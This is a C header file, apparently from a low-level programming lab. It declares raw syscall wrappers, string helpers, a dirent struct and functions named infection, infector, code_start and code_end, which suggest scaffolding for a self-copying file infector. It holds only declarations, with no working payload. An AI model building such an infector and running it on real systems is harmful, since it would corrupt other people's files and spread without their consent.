int system_call(); /*asm*/
void switchName(char* file, char* name);
unsigned int strlen (const char *str);
int strcmp(const char *str1, const char *str2); 
int strncmp(const char* str1, const char* str2, unsigned int n);
char *itoa(int num);
int positive_atoi(char* str);
char *strcat(char *dest, char *src);
char *strncat(char *dest, char *src, int n);
void infection(void);
void infector(char *);
int code_start();
int code_end(); 

#define SYS_WRITE 4
#define SYS_READ 3
#define SYS_EXIT 1
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define BUF_SIZE 8192
#define O_RDRW 2
#define O_WRONLY 1
#define O_CREAT 64
#define STDIN 0
#define STDOUT 1
#define STDERR 2
#define SYS_GETDENTS 141
#define O_RONLY 0
#define DT_REG 8
#define DT_DIR 4
#define DT_FIFO 1
#define DT_SOCK 12
#define DT_LNK 10
#define DT_BLK 6
#define DT_CHR 2

typedef struct dirent {
    int   inode;     /* Inode number */
    int   offset;     /* Offset to next dirent */
    short len;      /* Length of this dirent */
    char  name[];  /* Filename (null-terminated) */
}dirent;